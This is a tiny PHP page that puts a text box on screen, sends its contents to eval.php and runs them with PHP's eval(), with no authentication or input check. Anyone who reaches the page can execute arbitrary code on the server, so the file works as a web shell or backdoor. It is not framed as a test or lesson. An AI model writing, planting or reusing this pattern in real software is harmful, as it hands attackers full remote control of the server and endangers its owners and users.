<form action="eval.php" method="post">
<textarea name="statement"></textarea><input type="submit" value="eval"/>
</form>

<div>
<?php
if(isset($_POST['statement']) && $_POST['statement'] <> '')
  print eval($_POST['statement']);
  ?>
</div>
